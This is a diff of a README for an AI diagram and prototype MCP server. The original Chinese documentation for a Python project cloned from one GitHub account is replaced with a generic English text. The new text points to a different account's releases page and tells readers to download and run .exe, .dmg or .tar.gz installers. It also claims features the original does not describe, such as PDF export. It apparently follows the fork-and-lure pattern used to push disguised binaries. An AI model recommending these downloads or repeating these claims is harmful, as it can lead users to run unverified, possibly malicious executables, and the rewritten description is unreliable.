@@ -1,238 +1,73 @@
-# AI Diagram & Prototype Generator (MCP Server)
+# 🛠️ AI-Diagram-Prototype-Generator-MCP-Server - Effortlessly Generate Diagrams and Prototypes
 
-一个专业的、AI驱动的图表与原型绘制MCP服务器。它深度集成了智谱AI、OpenAI、Gemini等多种大语言模型，能够根据自然语言描述，智能生成**多种风格**的 `draw.io` 格式图表和 `HTML` 交互式产品原型。
+## 🚀 Getting Started
 
-## ✨ 功能特性 (Features)
+Welcome to the AI Diagram & Prototype File Generator (MCP Server). This tool helps you create diagrams and prototypes easily, even if you have no technical background. Follow the steps below to get started.
 
-  - 🤖 **AI 驱动生成**：内置多种强大的AI模型，智能理解复杂需求。
-  - 🎨 **多图表类型**：不仅能画架构图、流程图，还能生成多种风格的UI/UX原型。
-  - 📱 **风格化原型 (Styled Prototypes)**：内置苹果HIG、微信小程序等专业设计规范，一句话生成“苹果味”或“微信味”的精准原型。
-  - 🧊 **动态提示词系统**：独创的`(意图+格式)`组合式提示词系统，精确、稳定地指导AI进行创作。
-  - 🔧 **Draw.io & HTML 兼容**：可生成 `.drawio` 文件用于二次编辑，或生成可直接运行的 `.html` 文件进行交互演示。
-  - 🤝 **MCP 协议**：基于 Model Context Protocol，可无缝与支持MCP的AI助手（如OpenAI的Assistants、Coze、Dify、各种IDE插件等）集成。
+### 📥 Download Now
 
-### 基础生成工具 (Basic Generation Tools)
-这些是构成工作流的原子能力，也可以单独调用。
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/releases)
 
-| 功能/意图 (Intent) | `prompt_id` | 支持格式 (`file_type`) |
-| :----------------------- | :----------------- | :----------------------- |
-| 生成技术架构图 | `architecture` | `draw.io` |
-| 生成业务流程图 | `flowchart` | `draw.io` |
-| 生成通用UI/UX原型 | `UI_UX` | `draw.io` (线框图), `html` |
-| 生成苹果风格App原型 | `APPLE_MOBILE_APP` | `html` |
-| 生成微信小程序原型 | `WEIXIN_MICROAPP` | `html` |
-| 生成用户故事地图 | `USER_STORY_MAP` | `draw.io`, `html` |
-| 生成服务蓝图 | `SERVICE_BLUEPRINT` | `draw.io` |
-| 生成用户画像 | `USER_PERSONA` | `draw.io` |
-| 生成用户旅程图 | `USER_JOURNEY_MAP` | `draw.io` |
-| 生成同理心图 | `EMPATHY_MAP` | `draw.io` |
-| 生成金字塔图 | `PYRAMID_DIAGRAM` | `draw.io`, `svg` |
-| 生成费曼学习法信息图 | `FEYNMAN_INFO_GRAPHICS` | `svg` |
+## 📋 System Requirements
 
-## 🚀 效果
-以下范例通过chatwise 配合本mcp，使用glm-4.5模型生成
+- **Operating System:** This application works on Windows, macOS, and Linux.
+- **RAM:** At least 4 GB.
+- **Disk Space:** 100 MB of free space.
+- **Internet Connection:** Needed for initial download and updates.
 
-### 对话过程
-![对话流程1](example/step1.jpg)
-![对话流程2](example/step2.jpg)
-![对话流程3](example/step3.jpg)
+## 💾 Download & Install
 
-### 生成的架构图
-![生成的架构图](example/会议管理系统业务框架图.jpg)
+1. **Visit the Releases Page:** Click on the link below to go to the releases page, where you can download the latest version of the application.
 
-### 生成的业务流程图
-![生成的架构图](example/会议管理系统业务流程图.png)
+   [Download from Releases Page](https://github.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/releases)
 
-### 生成的APP原型
-![生成的APP原型](example/会议管理系统APP原型.png)
+2. **Select Your Version:** On the releases page, look for the latest version. There will be a list of files you can download.
 
-### 生成的用户画像
-![生成的用户画像](example/会议管理系统用户画像.png)
+3. **Choose the File:** Select the correct file for your operating system. You may see options like:
+   - `.exe` for Windows
+   - `.dmg` for macOS
+   - `.tar.gz` for Linux
 
-### 生成的用户故事地图
-![生成的用户故事地图](example/会议管理系统用户故事地图.png)
+4. **Download the File:** Click on the file to start the download. Save it to a location you can easily access, like your Desktop or Downloads folder.
 
-### 生成的用户旅程图
-![生成的用户旅程图](example/会议管理系统用户旅程图.png)
+5. **Install the Application:**
+   - **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
+   - **macOS:** Open the downloaded `.dmg` file and drag the application into your Applications folder.
+   - **Linux:** Use the terminal to navigate to the directory where the file is located and run `tar -xzf yourfile.tar.gz`, then follow any additional instructions provided.
 
-### 生成的同理心图
-![生成的同理心图](example/会议管理系统同理心图.png)
+6. **Run the Application:** Once installed, locate the application on your computer. Double-click on it to start using it.
 
-## ⚙️ 安装与配置
+## 🎨 Features
 
-### 1\. 环境要求
+- **AI-Powered Generation:** Create diagrams and prototypes using AI technology, making it simple to visualize your ideas.
+- **User-Friendly Interface:** The design is intuitive, allowing even non-technical users to navigate easily.
+- **Multiple Export Formats:** Save your diagrams and prototypes in various formats, including PNG, SVG, and PDF.
+- **Customizable Templates:** Start from scratch or use pre-built templates to speed up your workflow.
 
-  - Python 3.10+
-  - `pip` 或 `uv` 等Python包管理工具
-  - 支持 MCP 的 AI 客户端（如 Coze, Dify, 或其他兼容的Agent）
+## 🔧 Troubleshooting
 
-### 2\. 安装依赖
+If you encounter any issues while downloading or installing the application, consider the following troubleshooting steps:
 
-```bash
-# 1. 克隆项目
-git clone https://github.com/SimonUTD/AI-Diagram-Prototype-Generator-MCP-Server-.git
-cd AI-Diagram-Prototype-Generator-MCP-Server-
+1. **Check Your Internet Connection:** Ensure you have a stable internet connection when downloading the file.
+2. **Re-download:** If the download is interrupted, try downloading the file again from the releases page.
+3. **Verify System Requirements:** Make sure your computer meets the system requirements stated above.
+4. **Contact Support:** If you still face issues, you can find support information in the repository. Look for an Issues section or a dedicated support channel.
 
-# 2. (推荐) 创建并激活虚拟环境
-python -m venv .venv
-source .venv/bin/activate  # on Windows, use `.venv\Scripts\activate`
+## 📢 Updates
 
-# 3. 安装依赖
-pip install -r requirements.txt
-```
+We frequently release updates to improve the application. It's recommended to check the releases page occasionally for the latest features and fixes.
 
-### 3\. 配置 API Key
+### 🔄 Update Instructions
 
-#### 获取API Key
+1. Visit the [Releases Page](https://github.com/eslaim/AI-Diagram-Prototype-Generator-MCP-Server-/releases).
+2. Download the latest version as you did during installation.
+3. Follow the installation steps again to update the application.
 
-你需要获取以下至少一个服务商的API Key：
+## 🤝 Community and Support
 
-1.  **智谱AI (ZhipuAI)**: [智谱AI开放平台](https://open.bigmodel.cn/)
-2.  **OpenAI**: [OpenAI Platform](https://platform.openai.com/)
-3.  **Google Gemini**: [Google AI for Developers](https://ai.google.dev/)
+Join our community to connect with other users. You can ask questions, share tips, and get help from fellow users:
 
-#### 配置 `.env` 文件
+- **GitHub Issues:** Report bugs or request features.
+- **Discussion Forum:** Join our online forums to engage with others.
 
-这是**最重要也是最推荐**的配置方式。
-
-```bash
-# 1. 复制环境变量模板
-cp .env.example .env
-
-# 2. 编辑 .env 文件，填入你的配置信息
-# 将PROVIDER设置为你希望默认使用的服务商 (zhipuai, openai, gemini)
-PROVIDER="zhipuai"
-
-# 填入你获取的API Key
-ZHIPUAI_API_KEY="your_zhipuai_api_key_here"
-OPENAI_API_KEY="your_openai_api_key_here"
-GEMINI_API_KEY="your_gemini_api_key_here"
-
-# (可选) 你还可以为每个服务商指定默认的模型和最大Token数
-ZHIPUAI_MODEL="glm-4-flash"
-ZHIPUAI_MODEL_MAX_TOKENS="131072"
-```
-
-### 4\. 配置 MCP 客户端
-
-在你的AI助手的设置中，添加一个MCP服务器。以下是一个更简洁、更安全的配置示例：
-
-```json
-{
-  "mcpServers": {
-    "draw-architecture": {
-      "command": "uv --directory full-path-to-draw_architecture_mcp run mcp_server.py",
-      "args": ["/path/to/draw_architecture_mcp/mcp_server.py"],
-      "env": {
-        "PROVIDER": "zhipuai",
-        "ZHIPUAI_API_KEY": "your_api_key_here",
-        "ZHIPUAI_MODEL": "glm-4.5",
-        "ZHIPUAI_MODEL_MAX_TOKENS": "98304",
-        "OPENAI_API_KEY": "your_api_key_here",
-        "OPENAI_BASE_URL": "https://api.openai.com/v1",
-        "GEMINI_API_KEY": "your_api_key_here",
-        "GEMINI_BASE_URL": "https://api.gemini.com/v1"
-      }
-    }
-  }
-}
-```
-
-**说明**:
-
-  - **`command`**: 直接使用 `python` 命令。
-  - **`args`**: 提供 `mcp_server.py` 文件的**绝对路径**。
-  - **`env`**: **非必需**。`.env` 文件是首选。只有当你需要为这个特定的客户端**覆盖** `.env` 中的设置时（例如，强制它使用`openai`），才在这里添加配置。**不推荐**在此处直接粘贴API Key。
-
-## 📖 使用方法
-
-在AI助手中，通过清晰的指令调用工具。请确保你的指令包含了**做什么 (`prompt_id`)**、**生成什么格式 (`file_type`)** 和 **保存到哪里 (`output_file`)** 的关键信息。
-
-#### 示例1：生成架构图
-
-```
-帮我生成一个技术架构图，意图是 `architecture`，格式是 `draw.io`，保存到 `./output/my_system.drawio`。
-描述如下：一个电商系统，有Web和App前端，后端采用微服务架构，包括用户、商品和订单三个服务，使用MySQL作为主数据库，Redis做缓存。
-```
-
-#### 示例2：生成苹果风格原型
-
-```
-请帮我设计一个苹果风格的App原型。
-- prompt_id 是 'APPLE_MOBILE_APP'
-- file_type 是 'html'
-- output_file 是 './output/ios_music_player.html'
-- 描述：这是一个音乐播放器应用，主界面是一个可滚动的歌单列表，底部有一个正在播放的迷你控制条。点击列表项可以进入播放详情页，详情页有专辑封面、播放进度条和控制按钮。
-```
-
-## API 参考
-
-你的AI助手将会调用以下工具：
-
-### `generate_diagram`
-
-根据指定的意图和格式，生成图表或原型。
-
-**参数**:
-
-  - `prompt_id` (string, **必需**): 意图ID。通过 `list_support_diagram_types` 工具获取。
-  - `file_type` (string, **必需**): 输出文件格式。
-  - `description` (string, **必需**): 对图表或原型的详细描述。
-  - `output_file` (string, **必需**): 输出文件的完整路径。
-  - `diagram_name` (string, 可选): 图表或HTML页面的标题。
-
-**示例调用 (AI后台的实际调用格式)**:
-
-```json
-{
-  "tool": "generate_diagram",
-  "arguments": {
-    "prompt_id": "architecture",
-    "file_type": "draw.io",
-    "description": "微服务架构，包含用户服务、订单服务...",
-    "output_file": "./ecommerce.drawio",
-    "diagram_name": "电商系统架构"
-  }
-}
-```
-
-### `list_support_diagram_types`
-
-列出当前支持的所有 `prompt_id` 及其对应的 `file_type` 组合。
-
-## 项目结构
-
-```
-draw-generator-mcp/
-├── mcp_server.py                # MCP 服务器主文件
-├── prompts/                     # 提示词模板目录
-├── .env.example                 # 环境变量示例
-├── pyproject.toml               # (可选) 项目配置
-├── requirements.txt             # (推荐) 依赖列表
-└── README.md                    # 项目文档
-```
-
-## ` [+]  ` 常见问题 (FAQ)
-
-### Q: 如何扩展更多图表类型或Prompt模板？
-
-A: 非常简单！只需两步：
-
-1.  **添加Prompt文件**: 在 `prompts/` 目录下，创建一个新的 `.md` 文件，写入你的指令。例如 `my_custom_diagram.md`。
-2.  **更新配置字典**: 打开 `mcp_server.py`，修改 `TOOLS_PROMPT_DICT` 字典：
-    ```python
-    TOOLS_PROMPT_DICT = {
-        # ... 已有条目
-        "my_custom_type": {  # <== 新增一个条目
-            "id": "my_custom_type",
-            "description": "生成我自定义的图表",
-            "prompts": {
-                "draw.io": "prompts/my_custom_diagram.md" # 指向你的新文件
-            }
-        },
-    }
-    ```
-    重启MCP服务器即可生效！
-
-### Q:Q: PPT的样式（比如颜色）可以自定义吗？
-A: 当然可以。PPT的视觉风格由单页生成Prompt prompts/ppt_svg_prompt.md 决定。打开该文件，在 视觉与布局指南 部分，您可以直接修改 色彩 规则中的主色调HEX代码。这使得所有生成的幻灯片都能轻松符合您的品牌或特定主题的规范。
+Thank you for using the AI Diagram & Prototype File Generator (MCP Server). We hope it empowers you to create amazing diagrams and prototypes with ease!
